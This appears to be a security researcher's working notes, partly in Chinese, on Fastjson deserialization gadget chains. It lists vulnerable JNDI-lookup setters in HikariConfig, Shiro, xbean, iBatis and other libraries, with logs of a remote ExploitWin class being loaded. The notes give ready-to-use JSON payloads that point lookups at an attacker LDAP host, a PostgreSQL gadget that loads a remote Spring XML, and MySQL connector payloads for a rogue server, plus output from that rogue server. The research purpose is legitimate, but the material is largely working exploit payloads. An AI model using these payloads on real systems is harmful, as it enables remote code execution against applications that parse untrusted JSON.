### org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig
```java
    public HikariConfig() {
        this.dataSourceProperties = new Properties();
        this.healthCheckProperties = new Properties();
        this.minIdle = -1;
        this.maxPoolSize = -1;
        this.maxLifetime = MAX_LIFETIME;
        this.connectionTimeout = CONNECTION_TIMEOUT;
        this.validationTimeout = VALIDATION_TIMEOUT;
        this.idleTimeout = IDLE_TIMEOUT;
        this.initializationFailTimeout = 1L;
        this.isAutoCommit = true;
        String systemProp = System.getProperty("hikaricp.configurationFile");
        if (systemProp != null) {
            this.loadProperties(systemProp);
        }

    }
    
    public void setMetricRegistry(Object metricRegistry) {
        if (this.metricsTrackerFactory != null) {
            throw new IllegalStateException("cannot use setMetricRegistry() and setMetricsTrackerFactory() together");
        } else {
            if (metricRegistry != null) {
                if (metricRegistry instanceof String) {
                    try {
                        InitialContext initCtx = new InitialContext();
                        metricRegistry = initCtx.lookup((String)metricRegistry);
                    } catch (NamingException var3) {
                        throw new IllegalArgumentException(var3);
                    }
                }

                if (!(metricRegistry instanceof MetricRegistry)) {
                    throw new IllegalArgumentException("Class must be an instance of com.codahale.metrics.MetricRegistry");
                }
            }

            this.metricRegistry = metricRegistry;
        }
    }
    
    
    public void setHealthCheckRegistry(Object healthCheckRegistry) {
        if (healthCheckRegistry != null) {
            if (healthCheckRegistry instanceof String) {
                try {
                    InitialContext initCtx = new InitialContext();
                    healthCheckRegistry = initCtx.lookup((String)healthCheckRegistry);
                } catch (NamingException var3) {
                    throw new IllegalArgumentException(var3);
                }
            }

            if (!(healthCheckRegistry instanceof HealthCheckRegistry)) {
                throw new IllegalArgumentException("Class must be an instance of com.codahale.metrics.health.HealthCheckRegistry");
            }
        }

        this.healthCheckRegistry = healthCheckRegistry;
    }
```

### org.apache.shiro.realm.jndi.JndiRealmFactory
JndiRealmFactory.java
```java
    public JndiRealmFactory() {
    }

    public Collection<String> getJndiNames() {
        return this.jndiNames;
    }

    public void setJndiNames(Collection<String> jndiNames) {
        this.jndiNames = jndiNames;
    }

    public void setJndiNames(String commaDelimited) throws IllegalStateException {
        String arg = StringUtils.clean(commaDelimited);
        if (arg == null) {
            String msg = "One or more comma-delimited jndi names must be specified for the " + this.getClass().getName() + " to locate Realms.";
            throw new IllegalStateException(msg);
        } else {
            String[] names = StringUtils.tokenizeToStringArray(arg, ",");
            this.setJndiNames((Collection)Arrays.asList(names));
        }
    }

    public Collection<Realm> getRealms() throws IllegalStateException {
        Collection<String> jndiNames = this.getJndiNames();
        if (jndiNames != null && !jndiNames.isEmpty()) {
            List<Realm> realms = new ArrayList(jndiNames.size());
            Iterator i$ = jndiNames.iterator();

            while(i$.hasNext()) {
                String name = (String)i$.next();

                try {
                    Realm realm = (Realm)this.lookup(name, Realm.class);
                    realms.add(realm);
                } catch (Exception var6) {
                    throw new IllegalStateException("Unable to look up realm with jndi name '" + name + "'.", var6);
                }
            }

            return realms.isEmpty() ? null : realms;
        } else {
            String msg = "One or more jndi names must be specified for the " + this.getClass().getName() + " to locate Realms.";
            throw new IllegalStateException(msg);
        }
    }
```

org.apache.shiro.jndi.JndiLocator.java
```java
    protected Object lookup(String jndiName, Class requiredType) throws NamingException {
        if (jndiName == null) {
            throw new IllegalArgumentException("jndiName argument must not be null");
        } else {
            String convertedName = this.convertJndiName(jndiName);

            Object jndiObject;
            try {
                jndiObject = this.getJndiTemplate().lookup(convertedName, requiredType);
            } catch (NamingException var6) {
                if (convertedName.equals(jndiName)) {
                    throw var6;
                }

                if (log.isDebugEnabled()) {
                    log.debug("Converted JNDI name [" + convertedName + "] not found - trying original name [" + jndiName + "]. " + var6);
                }

                jndiObject = this.getJndiTemplate().lookup(jndiName, requiredType);
            }

            log.debug("Located object with JNDI name '{}'", convertedName);
            return jndiObject;
        }
    }
```

org.apache.shiro.jndi.JndiTemplate.java
```java
    public Object lookup(String name, Class requiredType) throws NamingException {
        Object jndiObject = this.lookup(name);
        if (requiredType != null && !requiredType.isInstance(jndiObject)) {
            String msg = "Jndi object acquired under name '" + name + "' is of type [" + jndiObject.getClass().getName() + "] and not assignable to the required type [" + requiredType.getName() + "].";
            throw new NamingException(msg);
        } else {
            return jndiObject;
        }
    }
    
    
    public Object lookup(final String name) throws NamingException {
        log.debug("Looking up JNDI object with name '{}'", name);
        return this.execute(new JndiCallback() {
            public Object doInContext(Context ctx) throws NamingException {
                Object located = ctx.lookup(name);
                if (located == null) {
                    throw new NameNotFoundException("JNDI object with [" + name + "] not found: JNDI implementation returned null");
                } else {
                    return located;
                }
            }
        });
    }
```

### org.apache.xbean.propertyeditor.JndiConverter
JndiConverter.java
```
public class JndiConverter extends AbstractConverter {
    public JndiConverter() {
        super(Context.class);
    }

    protected Object toObjectImpl(String text) {
        try {
            InitialContext context = new InitialContext();
            return (Context)context.lookup(text);
        } catch (NamingException var3) {
            throw new PropertyEditorException(var3);
        }
    }
}
```

AbstractConverter.java
```java
    public final void setAsText(String text) {
        Object value = this.toObject(this.trim ? text.trim() : text);
        super.setValue(value);
    }
    
    public final Object toObject(String text) {
        if (text == null) {
            return null;
        } else {
            Object value = this.toObjectImpl(this.trim ? text.trim() : text);
            return value;
        }
    }
    
    protected abstract Object toObjectImpl(String var1);
```

log:
```
org.apache.xbean.propertyeditor.PropertyEditorException: javax.naming.NamingException: problem generating object using object factory [Root exception is java.lang.ClassCastException: ExploitWin cannot be cast to javax.naming.spi.ObjectFactory]; remaining name 'calc'
	at org.apache.xbean.propertyeditor.JndiConverter.toObjectImpl(JndiConverter.java:37)
	at org.apache.xbean.propertyeditor.AbstractConverter.toObject(AbstractConverter.java:86)
	at org.apache.xbean.propertyeditor.AbstractConverter.setAsText(AbstractConverter.java:59)
	at com.alibaba.fastjson.parser.deserializer.FastjsonASMDeserializer_1_JndiConverter.deserialze(Unknown Source)
	at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:284)
```


### com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig
```java
    public JtaTransactionConfig() {
    }
    
    public void setProperties(Properties props) throws SQLException, TransactionException {
        String utxName = null;

        try {
            utxName = (String)props.get("UserTransaction");
            InitialContext initCtx = new InitialContext();
            this.userTransaction = (UserTransaction)initCtx.lookup(utxName);
        } catch (NamingException var4) {
            throw new SqlMapException("Error initializing JtaTransactionConfig while looking up UserTransaction (" + utxName + ").  Cause: " + var4);
        }
```

in poc by
```
    "properties": {
        "@type": "java.util.Properties",
        "UserTransaction": "ldap://192.168.85.1:1389/calc"
    }
```
setting this property `UserTransaction` as value `ldap://192.168.85.1:1389/calc`, for `JtaTransactionConfig#setProperties` to do
```java
utxName = (String)props.get("UserTransaction");
```


log:
```
com.ibatis.sqlmap.client.SqlMapException: Error initializing JtaTransactionConfig while looking up UserTransaction (ldap://192.168.85.1:1389/calc).  Cause: javax.naming.NamingException: problem generating object using object factory [Root exception is java.lang.ClassCastException: ExploitWin cannot be cast to javax.naming.spi.ObjectFactory]; remaining name 'calc'
	at com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig.setProperties(JtaTransactionConfig.java:49)
	at com.alibaba.fastjson.parser.deserializer.FastjsonASMDeserializer_1_JtaTransactionConfig.deserialze(Unknown Source)
	at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:284)
```




### org.apache.cocoon.components.slide.impl.JMSContentInterceptor
```java
    public JMSContentInterceptor() {
    }
    
    public void setParameters(Hashtable params) {
        super.setParameters(params);
        this.m_topicFactoryName = this.getParameter("topic-factory", "JmsTopicConnectionFactory");
        this.m_topicName = this.getParameter("topic", "topic1");
        boolean persistent = Boolean.valueOf(this.getParameter("persistent-delivery", "false"));
        this.m_deliveryMode = persistent ? 2 : 1;
        this.m_priority = Integer.valueOf(this.getParameter("priority", "4"));
        this.m_timeToLive = Long.valueOf(this.getParameter("time-to-live", "1000"));
        this.m_jndiProps = new Hashtable();
        this.m_jndiProps.put("java.naming.factory.initial", this.getParameter("java.naming.factory.initial", "org.exolab.jms.jndi.InitialContextFactory"));
        this.m_jndiProps.put("java.naming.provider.url", this.getParameter("java.naming.provider.url", "rmi://localhost:1099/"));
    }
    
    
    public void setNamespace(NamespaceAccessToken nat) {
        super.setNamespace(nat);

        try {
            Context context = new InitialContext(this.m_jndiProps);
            TopicConnectionFactory topicConnectionFactory = (TopicConnectionFactory)context.lookup(this.m_topicFactoryName);
            this.m_connection = topicConnectionFactory.createTopicConnection();
            this.m_connection.start();
            this.m_session = this.m_connection.createTopicSession(false, 3);
            this.m_topic = this.m_session.createTopic(this.m_topicName);
            this.m_publisher = this.m_session.createPublisher(this.m_topic);
            Thread t = new Thread(new Runnable() {
                public void run() {
                    JMSContentInterceptor.this.m_started = true;

                    while(JMSContentInterceptor.this.m_started) {
                        try {
                            Thread.sleep(1000L);
                        } catch (InterruptedException var6) {
                        }

                        if (JMSContentInterceptor.this.m_queue.size() != 0) {
                            List list = JMSContentInterceptor.this.m_queue;
                            JMSContentInterceptor.this.m_queue = Collections.synchronizedList(new ArrayList());
                            Iterator iter = list.iterator();

                            while(iter.hasNext()) {
                                String msg = (String)iter.next();
                                if (JMSContentInterceptor.this.getLogger().isEnabled(6)) {
                                    JMSContentInterceptor.this.getLogger().log("Sending message: " + msg, 6);
                                }

                                try {
                                    JMSContentInterceptor.this.m_publisher.publish(JMSContentInterceptor.this.m_session.createTextMessage(msg), JMSContentInterceptor.this.m_deliveryMode, JMSContentInterceptor.this.m_priority, JMSContentInterceptor.this.m_timeToLive);
                                } catch (JMSException var5) {
                                    JMSContentInterceptor.this.getLogger().log("Failure sending JMS message.", var5, "JMSContentInterceptor", 2);
                                }
                            }
                        }
                    }

                }
            });
            t.setPriority(5);
            t.start();
        } catch (NamingException var5) {
            this.getLogger().log("Failure while connecting to JMS server.", var5, "JMSContentInterceptor", 2);
        } catch (JMSException var6) {
            this.getLogger().log("Failure while connecting to JMS server.", var6, "JMSContentInterceptor", 2);
        }

    }
```

log:
```
com.alibaba.fastjson.JSONException: set property error, org.apache.cocoon.components.slide.impl.JMSContentInterceptor#namespace
	at com.alibaba.fastjson.parser.deserializer.FieldDeserializer.setValue(FieldDeserializer.java:162)
	at com.alibaba.fastjson.parser.deserializer.DefaultFieldDeserializer.parseField(DefaultFieldDeserializer.java:123)
	at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:838)
	at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.parseRest(JavaBeanDeserializer.java:1555)
	at com.alibaba.fastjson.parser.deserializer.FastjsonASMDeserializer_1_JMSContentInterceptor.deserialze(Unknown Source)
	at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:284)
  
...

Caused by: java.lang.reflect.InvocationTargetException
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:498)
	at com.alibaba.fastjson.parser.deserializer.FieldDeserializer.setValue(FieldDeserializer.java:110)
	... 136 more
Caused by: java.lang.NullPointerException
	at org.apache.cocoon.components.slide.impl.JMSContentInterceptor.getLogger(JMSContentInterceptor.java:283)
	at org.apache.cocoon.components.slide.impl.JMSContentInterceptor.setNamespace(JMSContentInterceptor.java:217)
	... 141 more
```

### br.com.anteros.dbcp.AnterosDBCPConfig
```java
    public AnterosDBCPConfig() {
        this.dataSourceProperties = new Properties();
        this.healthCheckProperties = new Properties();
        this.minIdle = -1;
        this.maxPoolSize = -1;
        this.maxLifetime = MAX_LIFETIME;
        this.connectionTimeout = CONNECTION_TIMEOUT;
        this.validationTimeout = VALIDATION_TIMEOUT;
        this.idleTimeout = IDLE_TIMEOUT;
        this.initializationFailTimeout = 1L;
        this.isAutoCommit = true;
        String systemProp = System.getProperty("hikaricp.configurationFile");
        if (systemProp != null) {
            this.loadProperties(systemProp);
        }

    }
    
    
    
    public void setHealthCheckRegistry(Object healthCheckRegistry) {
        this.checkIfSealed();
        if (healthCheckRegistry != null) {
            healthCheckRegistry = this.getObjectOrPerformJndiLookup(healthCheckRegistry);
            if (!(healthCheckRegistry instanceof HealthCheckRegistry)) {
                throw new IllegalArgumentException("Class must be an instance of com.codahale.metrics.health.HealthCheckRegistry");
            }
        }

        this.healthCheckRegistry = healthCheckRegistry;
    }
    
    
    
    private Object getObjectOrPerformJndiLookup(Object object) {
        if (object instanceof String) {
            try {
                InitialContext initCtx = new InitialContext();
                return initCtx.lookup((String)object);
            } catch (NamingException var3) {
                throw new IllegalArgumentException(var3);
            }
        } else {
            return object;
        }
    }
```

log:
```
java.lang.IllegalArgumentException: javax.naming.NamingException: problem generating object using object factory [Root exception is java.lang.ClassCastException: ExploitWin cannot be cast to javax.naming.spi.ObjectFactory]; remaining name 'Calc'
	at br.com.anteros.dbcp.AnterosDBCPConfig.getObjectOrPerformJndiLookup(AnterosDBCPConfig.java:1114)
	at br.com.anteros.dbcp.AnterosDBCPConfig.setHealthCheckRegistry(AnterosDBCPConfig.java:697)
	at com.alibaba.fastjson.parser.deserializer.FastjsonASMDeserializer_2_AnterosDBCPConfig.deserialze(Unknown Source)
	at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:284)
```


### org.apache.commons.proxy.provider.remoting.SessionBeanProvider

```java
public class SessionBeanProvider implements ObjectProvider {
    private final String jndiName;
    private final Class homeInterface;
    private final Properties properties;

    public SessionBeanProvider(String jndiName, Class homeInterface) {
        this.jndiName = jndiName;
        this.homeInterface = homeInterface;
        this.properties = null;
    }

    public Object getObject() {
        try {
            InitialContext initialContext = this.properties == null ? new InitialContext() : new InitialContext(this.properties);
            Object homeObject = PortableRemoteObject.narrow(initialContext.lookup(this.jndiName), this.homeInterface);
            Method createMethod = homeObject.getClass().getMethod("create", ProxyUtils.EMPTY_ARGUMENT_TYPES);
            return createMethod.invoke(homeObject, ProxyUtils.EMPTY_ARGUMENTS);
        } catch (NoSuchMethodException var4) {
            throw new ObjectProviderException("Unable to find no-arg create() method on home interface " + this.homeInterface.getName() + ".", var4);
        } catch (IllegalAccessException var5) {
            throw new ObjectProviderException("No-arg create() method on home interface " + this.homeInterface.getName() + " is not accessible.", var5);
        } catch (NamingException var6) {
            throw new ObjectProviderException("Unable to lookup EJB home object in JNDI.", var6);
        } catch (InvocationTargetException var7) {
            throw new ObjectProviderException("No-arg create() method on home interface " + this.homeInterface.getName() + " threw an exception.", var7);
        }
    }
    
}
```

log:
```
Caused by: javax.naming.NamingException: problem generating object using object factory [Root exception is java.lang.ClassCastException: ExploitWin cannot be cast to javax.naming.spi.ObjectFactory]; remaining name 'Calc'
	at com.sun.jndi.ldap.LdapCtx.c_lookup(LdapCtx.java:1092)
	at com.sun.jndi.toolkit.ctx.ComponentContext.p_lookup(ComponentContext.java:542)
	at com.sun.jndi.toolkit.ctx.PartialCompositeContext.lookup(PartialCompositeContext.java:177)
	at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205)
	at com.sun.jndi.url.ldap.ldapURLContext.lookup(ldapURLContext.java:94)
	at javax.naming.InitialContext.lookup(InitialContext.java:417)
	at org.apache.commons.proxy.provider.remoting.SessionBeanProvider.getObject(SessionBeanProvider.java:75)
```


### com.zaxxer.hikari.HikariConfig
```java
    public HikariConfig() {
        this.dataSourceProperties = new Properties();
        this.healthCheckProperties = new Properties();
        this.minIdle = -1;
        this.maxPoolSize = -1;
        this.maxLifetime = MAX_LIFETIME;
        this.connectionTimeout = CONNECTION_TIMEOUT;
        this.validationTimeout = VALIDATION_TIMEOUT;
        this.idleTimeout = IDLE_TIMEOUT;
        this.initializationFailTimeout = 1L;
        this.isAutoCommit = true;
        String systemProp = System.getProperty("hikaricp.configurationFile");
        if (systemProp != null) {
            this.loadProperties(systemProp);
        }

    }
    
    
    public void setHealthCheckRegistry(Object healthCheckRegistry) {
        this.checkIfSealed();
        if (healthCheckRegistry != null) {
            healthCheckRegistry = this.getObjectOrPerformJndiLookup(healthCheckRegistry);
            if (!(healthCheckRegistry instanceof HealthCheckRegistry)) {
                throw new IllegalArgumentException("Class must be an instance of com.codahale.metrics.health.HealthCheckRegistry");
            }
        }

        this.healthCheckRegistry = healthCheckRegistry;
    }
    
    private Object getObjectOrPerformJndiLookup(Object object) {
        if (object instanceof String) {
            try {
                InitialContext initCtx = new InitialContext();
                return initCtx.lookup((String)object);
            } catch (NamingException var3) {
                throw new IllegalArgumentException(var3);
            }
        } else {
            return object;
        }
    }
```

log:
```
java.lang.IllegalArgumentException: javax.naming.NamingException: problem generating object using object factory [Root exception is java.lang.ClassCastException: ExploitWin cannot be cast to javax.naming.spi.ObjectFactory]; remaining name 'Calc'
	at com.zaxxer.hikari.HikariConfig.getObjectOrPerformJndiLookup(HikariConfig.java:1112)
	at com.zaxxer.hikari.HikariConfig.setHealthCheckRegistry(HikariConfig.java:695)
	at com.alibaba.fastjson.parser.deserializer.FastjsonASMDeserializer_1_HikariConfig.deserialze(Unknown Source)
	at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:284)
```


### commons-io

2.4版本的log
```
Exception in thread "main" java.lang.NullPointerException
	at org.apache.commons.io.output.WriterOutputStream.processInput(WriterOutputStream.java:280)
	at org.apache.commons.io.output.WriterOutputStream.write(WriterOutputStream.java:213)
	at org.apache.commons.io.output.WriterOutputStream.write(WriterOutputStream.java:241)
	at org.apache.commons.io.input.TeeInputStream.read(TeeInputStream.java:110)
	at org.apache.commons.io.input.BOMInputStream.getBOM(BOMInputStream.java:218)
	at com.alibaba.fastjson.serializer.ASMSerializer_3_BOMInputStream.write(Unknown Source)
	at com.alibaba.fastjson.serializer.MapSerializer.write(MapSerializer.java:271)
	at com.alibaba.fastjson.serializer.MapSerializer.write(MapSerializer.java:44)
	at com.alibaba.fastjson.serializer.JSONSerializer.write(JSONSerializer.java:285)
	at com.alibaba.fastjson.JSON.toJSONString(JSON.java:973)
	at com.alibaba.fastjson.JSON.toString(JSON.java:967)
	at com.alibaba.fastjson.JSONObject.getString(JSONObject.java:325)
	at com.alibaba.fastjson.serializer.MiscCodec.deserialze(MiscCodec.java:279)
	at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:395)
	at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:565)
	at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1401)
	at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1367)
	at com.alibaba.fastjson.JSON.parse(JSON.java:183)
	at com.alibaba.fastjson.JSON.parse(JSON.java:193)
	at com.alibaba.fastjson.JSON.parse(JSON.java:149)
	at com.alibaba.fastjson.JSON.parseObject(JSON.java:254)
	at com.cqq.fastjsonPOC.TestCommonsIO.main(TestCommonsIO.java:210)
```
2.6版本的log：
```
Exception in thread "main" com.alibaba.fastjson.JSONException: create instance error, null, public org.apache.commons.io.output.WriterOutputStream(java.io.Writer,java.nio.charset.Charset,int,boolean)
	at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:1016)
	at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:288)
	at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:284)
	at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:808)
	at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:288)
	at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:284)
	at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:395)
	at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:565)
	at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:565)
	at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1401)
	at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1367)
	at com.alibaba.fastjson.serializer.MiscCodec.deserialze(MiscCodec.java:261)
	at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:395)
	at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:565)
	at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1401)
	at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1367)
	at com.alibaba.fastjson.JSON.parse(JSON.java:183)
	at com.alibaba.fastjson.JSON.parse(JSON.java:193)
	at com.alibaba.fastjson.JSON.parse(JSON.java:149)
	at com.alibaba.fastjson.JSON.parseObject(JSON.java:254)
	at com.cqq.fastjsonPOC.TestCommonsIO.main(TestCommonsIO.java:210)
Caused by: java.lang.reflect.InvocationTargetException
	at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)
	at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62)
	at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)
	at java.lang.reflect.Constructor.newInstance(Constructor.java:423)
	at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:1012)
	... 20 more
Caused by: java.lang.NullPointerException
	at org.apache.commons.io.output.WriterOutputStream.<init>(WriterOutputStream.java:144)
	... 25 more
```

postgresql的gadget：
```
{
    "@type": "java.lang.AutoCloseable",
    "@type": "org.postgresql.jdbc.PgConnection",
    "hostSpecs": [{
        "host": "127.0.0.1",
        "port": 2333
    }],
    "user": "test",
    "database": "test",
    "info": {
        "socketFactory": "org.springframework.context.support.ClassPathXmlApplicationContext",
        "socketFactoryArg": "http://x.y.z.208:8888/test.xml"
    },
    "url": ""
}
```

42.3.3的org.postgresql:postgresql，
![image](https://user-images.githubusercontent.com/30398606/209430315-a2d4bd68-ee07-49ea-856c-c37b8fcb698b.png)

![image](https://user-images.githubusercontent.com/30398606/209432505-cdcdc136-be4f-4e11-b0cd-25acea65a828.png)

但是`ClassPathXmlApplicationContext`因为不是`java.net.SocketFactory`的子类，而失败。

在42.3.1的org.postgresql:postgresql，
![image](https://user-images.githubusercontent.com/30398606/209749750-f8e4be4c-3e73-474d-af6f-1c39753fd4fe.png)

![image](https://user-images.githubusercontent.com/30398606/209750185-f93dd77a-81c9-4ea3-bd04-9f651cdbbe43.png)


![image](https://user-images.githubusercontent.com/30398606/209750306-919d6698-a972-46b3-9cf1-461c6b580b77.png)


![image](https://user-images.githubusercontent.com/30398606/209750328-2b9e888d-2a08-4739-8ba6-44bd4098f763.png)

这里的socketFactory可以是任意支持接受一个String类型参数构造器的类？

再用42.2.6的测试，
![image](https://user-images.githubusercontent.com/30398606/209751264-2ff8d7cf-250f-48cb-bb8e-9079858462f0.png)
成功。

所以这个链的适用范围是(0, 42.3.1]?

Ref：
- https://github.com/pgjdbc/pgjdbc/security/advisories/GHSA-v7wg-cpwc-24m4
- [CVE-2022-21724] Unchecked Class Instantiation when providing Plugin Classes
- https://mvnrepository.com/artifact/org.postgresql/postgresql



### mysql-connector
> 8.0.19？
```json
{"@type":"java.lang.AutoCloseable","@type":"com.mysql.cj.jdbc.ha.ReplicationMySQLConnection","proxy":{"@type":"com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy","connectionUrl":{"@type":"com.mysql.cj.conf.url.ReplicationConnectionUrl", "sources": [{"host":""}], "replicas":[], "properties":{"host":"x.y.z.208",
"port":"33060","user":"user","dbname":"dbname","password":"pass","queryInterceptors":"com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor","autoDeserialize":"true",
"allowLoadLocalInfile":"true"}}}}
```

8.0.19？
```json
{"@type":"java.lang.AutoCloseable","@type":"com.mysql.cj.jdbc.ha.ReplicationMySQLConnection","proxy":{"@type":"com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy","connectionUrl":{"@type":"com.mysql.cj.conf.url.ReplicationConnectionUrl", "masters": [{"host":""}], "slaves":[], "properties":{"host":"x.y.z.208",
"port":"33060","user":"user","dbname":"dbname","password":"pass","queryInterceptors":"com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor","autoDeserialize":"true",
"allowLoadLocalInfile":"true"}}}}
```

尝试反序列化利用。
```
python3 rogue_mysql_server.py
```
结果：
```
Connection come from 220.x.y.z:43966
[*] Sending the package : 4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400
[*] Receiveing the package : b'\xe0\x00\x00\x01\x8f\xa2>\x01\xff\xff\xff\x00!\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00user\x00\x14\\\xf3o\xac\xa0&=k\xa0\x01H\x19G\xe8c\x9e\x1c\x9f\xc5\xd5dbname\x00mysql_native_password\x00\x88\x10_runtime_version\t1.8.0_202\x0f_client_version\x068.0.19\x0f_client_license\x03GPL\x0f_runtime_vendor\x12Oracle Corporation\x0c_client_name\x11MySQL Connector/J'
[*] Sending the package : 0700000200000002000000
[*] Receiveing the package : b'\xcc\x03\x00\x00\x03/* mysql-connector-java-8.0.19 (Revision: a0ca826f5cdf51a98356fdfb1bf251eb042f80bf) */SELECT  @@session.auto_increment_increment AS auto_increment_increment, @@character_set_client AS character_set_client, @@character_set_connection AS character_set_connection, @@character_set_results AS character_set_results, @@character_set_server AS character_set_server, @@collation_server AS collation_server, @@collation_connection AS collation_connection, @@init_connect AS init_connect, @@interactive_timeout AS interactive_timeout, @@license AS license, @@lower_case_table_names AS lower_case_table_names, @@max_allowed_packet AS max_allowed_packet, @@net_write_timeout AS net_write_timeout, @@performance_schema AS performance_schema, @@query_cache_size AS query_cache_size, @@query_cache_type AS query_cache_type, @@sql_mode AS sql_mode, @@system_time_zone AS system_time_zone, @@time_zone AS time_zone, @@tx_isolation AS transaction_isolation, @@wait_timeout AS wait_timeout'
[*] Sending the package : 01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000
[*] Receiveing the package : b'\x11\x00\x00\x00\x03SET NAMES latin1'
[*] Sending the package : 0700000200000002000000
[*] Receiveing the package : b'!\x00\x00\x00\x03SET character_set_results = NULL'
[*] Sending the package : 0700000200000002000000
[*] Receiveing the package : b'\x14\x00\x00\x00\x03SHOW SESSION STATUS'
open successs
[*] Sending the package : 01000001021a000002036465660001630163016301630c3f00ffff0000fc90000000001a000003036465660001630163016301630c3f00ffff0000fc900000000065010004fbfc6101aced0005737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c770800000010000000017372000c6a6176612e6e65742e55524c962537361afce47203000749000868617368436f6465490004706f72744c0009617574686f726974797400124c6a6176612f6c616e672f537472696e673b4c000466696c6571007e00034c0004686f737471007e00034c000870726f746f636f6c71007e00034c000372656671007e00037870ffffffffffffffff74002c6276617579393737713070773766687631747663336537366e78746f686535332e6f6173746966792e636f6d7400072f75726c646e7371007e000574000468747470707874003a687474703a2f2f6276617579393737713070773766687631747663336537366e78746f686535332e6f6173746966792e636f6d2f75726c646e737807000005fe000022000100
[*] Receiveing the package : b'\x0e\x00\x00\x00\x03SHOW WARNINGS'
